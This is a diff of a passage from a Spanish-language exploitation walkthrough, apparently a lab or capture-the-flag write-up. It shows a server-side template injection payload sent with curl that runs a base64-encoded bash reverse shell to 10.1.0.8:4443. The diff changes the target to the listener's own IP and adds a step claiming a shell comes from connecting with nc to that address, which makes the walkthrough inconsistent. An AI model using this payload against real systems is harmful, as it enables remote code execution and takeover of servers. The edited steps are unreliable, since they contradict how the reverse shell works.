@@ -30,5 +30,7 @@ PAYLOAD=$(echo bash -i >& /dev/tcp/10.1.0.8/4443 0>&1 | base64)
 
 Ejecutamos remotamente:
 ```curl
-curl -X POST "http://10.19.251.192:5042/evaluate"   -H "X-Debug-Render: true" -d "project_name={{ ''.__class__.__mro__[1].__subclasses__()[264].__init__.__globals__['__builtins__']['__import__']('os').popen('echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xLjAuOC80NDQzIDA%2BJjEK | base64 -d | bash').read() }}"
+curl -X POST "http://10.1.0.8:5042/evaluate"   -H "X-Debug-Render: true" -d "project_name={{ ''.__class__.__mro__[1].__subclasses__()[264].__init__.__globals__['__builtins__']['__import__']('os').popen('echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xLjAuOC80NDQzIDA%2BJjEK | base64 -d | bash').read() }}"
 ```
+
+Y obtenemos shell al hacer `nc 10.1.0.8 4443`.
